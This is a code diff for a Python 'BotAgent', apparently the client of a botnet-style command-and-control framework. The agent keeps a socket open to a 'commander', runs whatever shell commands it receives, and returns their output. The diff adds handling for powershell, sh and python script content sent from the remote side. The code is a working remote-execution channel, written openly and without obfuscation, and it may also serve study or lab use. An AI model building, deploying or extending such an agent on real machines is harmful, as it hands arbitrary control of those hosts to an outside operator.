@@ -1,14 +1,14 @@
 import os
-import subprocess
 import uuid
 import shlex
-from subprocess import Popen, PIPE
-from platform import system
 import json
-from pathlib import Path
 import time
-from math import pow
+import subprocess
 import configparser
+from math import pow
+from pathlib import Path
+from platform import system
+from subprocess import Popen, PIPE
 from socket import socket, AF_INET, SOCK_STREAM, gethostname
 
 
@@ -136,39 +136,36 @@ class BotAgent:
         if not isinstance(json_msg, dict):
             return
         msg = json_msg.get("message")
-        match msg:
-            case "botHostInfoReply":
-                print("Bot-agent {} received botHostInfoReply from commander".format(self.hostname))
-                self.last_online = time.time()
-            case "botHelloReply":
-                print("Bot-agent {} received botHelloReply from commander".format(self.hostname))
-                self.last_online = time.time()
-            case "exeCommand":
-                cmd = json_msg.get("command")
-                timeout = json_msg.get("timeout")
-                print("Bot-agent {} received exeCommand - {} from commander".format(self.hostname, cmd))
-                response, exit_code = self.__execute_command(cmd, timeout)
-                if response:
-                    payload = self.__build_json_payload("exeCommandReply", optional=(json_msg.get("command"),
-                                                        response, exit_code))
-                    if payload:
-                        try:
-                            print(
-                                "Sending {} from bot-agent {} to commander".format(payload.decode("utf-8"),
-                                                                                   self.hostname))
-                            self.sock.sendall(payload)
-                            self.last_online = time.time()
-                        except Exception as err:
-                            print("Unexpected exception for bot-agent {} when replying to command {}: {}".format(
-                                self.hostname, data, err))
-                            return
-                    else:
-                        return
-                else:
+        if msg in ["botHostInfoReply", "botHelloReply"]:
+            print("Bot-agent {} received {} from commander".format(self.hostname, msg))
+            self.last_online = time.time()
+        elif msg == "exeCommand":
+            cmd = json_msg.get("command")
+            timeout = json_msg.get("timeout")
+            print("Bot-agent {} received {} - {} from commander".format(self.hostname, msg, cmd))
+            response, exit_code = self.__execute_command(msg, timeout, cmd)
+            if response:
+                payload = self.__build_json_payload("exeCommandReply", cmd, response, exit_code)
+                if not payload or not self.__send_command(payload, json_msg):
                     return
-            case _:
-                print("Bot-agent {} received an unknown message from commander: {}".format(self.hostname, msg))
+            else:
                 return
+        elif msg == "exeScript":
+            script = json_msg.get("script")
+            script_type = json_msg.get("type")
+            timeout = json_msg.get("timeout")
+            script_data = json_msg.get("content")
+            print("Bot-agent {} received {} - {} from commander".format(self.hostname, msg, script_type))
+            response, exit_code = self.__execute_command(msg, timeout, script_type, script_data)
+            if response:
+                payload = self.__build_json_payload("exeScriptReply", script, response, exit_code)
+                if not payload or not self.__send_command(payload, json_msg):
+                    return
+            else:
+                return
+        else:
+            print("Bot-agent {} received an unknown message from commander: {}".format(self.hostname, msg))
+            return
         return True
 
     @staticmethod
@@ -178,15 +175,18 @@ class BotAgent:
         except Exception as err:
             print("Unexpected exception when deserializing message from commander: {}".format(err))
 
-    def __build_json_payload(self, msg, optional=None):
+    def __build_json_payload(self, msg, *args):
         match msg:
             case "botHostInfo":
                 d = {"message": msg, "uuid": self.uuid, "hostname": self.hostname, "os": self.os}
             case "botHello":
                 d = {"message": msg}
             case "exeCommandReply":
-                request, response, exit_code = optional
+                request, response, exit_code = args
                 d = {"message": msg, "command": request, "result": response, "exit_code": exit_code}
+            case "exeScriptReply":
+                s_path, response, exit_code = args
+                d = {"message": msg, "script": s_path, "result": response, "exit_code": exit_code}
             case _:
                 print("Internal error, json payload to build didn't match any supported message type")
                 return
@@ -224,14 +224,26 @@ class BotAgent:
                     else:
                         self.__self_identify()
 
-    def __execute_command(self, data, timeout):
-        try:
-            popen_payload = shlex.split(data)
-            command = popen_payload[0]
-        except Exception as err:
-            print("Unexpected exception when splitting command received from commander by bot-agent {}. Will not "
-                  "process it and just move on. Error: {}".format(self.hostname, err))
-            return False, False
+    def __execute_command(self, cmd_type, timeout, *args):
+        popen_payload = []
+        command = ""
+        if cmd_type == "exeCommand":
+            data, = args
+            try:
+                popen_payload = shlex.split(data)
+                command = popen_payload[0]
+            except Exception as err:
+                print("Unexpected exception when splitting command received from commander by bot-agent {}. Will not "
+                      "process it and just move on. Error: {}".format(self.hostname, err))
+                return False, False
+        elif cmd_type == "exeScript":
+            command, script_data = args
+            d = {
+                "powershell": [command, '-Command', script_data],
+                "sh"        : [command, '-c', script_data],
+                "python"    : [command, '-c', script_data]
+            }
+            popen_payload = d.get(command)
         if not self.__which(command):
             msg = "The command {} that commander has sent to bot-agent {} is unknown. Will not process it and just " \
                   "move on.".format(command, self.hostname)
@@ -242,7 +254,7 @@ class BotAgent:
             out, err = p.communicate(timeout=timeout)
         except subprocess.TimeoutExpired:
             p.kill()
-            response = "TimeoutExpired ({} seconds) from bot-agent {} for command{}".format(timeout, self.hostname, data)
+            response = "TimeoutExpired ({} seconds) from bot-agent {} for command{}".format(timeout, self.hostname, popen_payload)
             return response, p.returncode
         if out and err:
             response = "Output: {}, Error: {}".format(out, err)
@@ -251,8 +263,21 @@ class BotAgent:
         elif err:
             response = err
         else:
-            response = "Empty response from bot-agent {} for command {}".format(self.hostname, data)
+            response = "Empty response from bot-agent {} for command {}".format(self.hostname, popen_payload)
         return str(response), p.returncode
+
+    def __send_command(self, payload, json_msg):
+        try:
+            print(
+                "Sending {} from bot-agent {} to commander".format(payload.decode("utf-8"),
+                                                                   self.hostname))
+            self.sock.sendall(payload)
+            self.last_online = time.time()
+            return True
+        except Exception as err:
+            print("Unexpected exception for bot-agent {} when replying to command {}: {}".format(
+                self.hostname, json_msg, err))
+            return
 
     @staticmethod
     def __which(executable):
@@ -287,7 +312,7 @@ class BotAgent:
     def __read_buffer(self):
         buffer = self.__read_initial()
         if not buffer:
-            print("EOF received from commander by bot-agent {}".format(self.hostname))
+            print("Buffer of bot-agent {} is empty".format(self.hostname))
             return False
         buffering = True
         data_list = []
@@ -310,7 +335,7 @@ class BotAgent:
             buffer = self.sock.recv(self.conn_buff)
         except TimeoutError:
             print("Timeout of {} seconds exceeded. Bot-agent {} has not received input stream from commander".
-                  format(self.hostname, self.recv_tout))
+                  format(self.recv_tout, self.hostname))
             return False
         except Exception as err:
             print("Unexpected error on bot-agent {} when reading input stream from commander, error: {}".
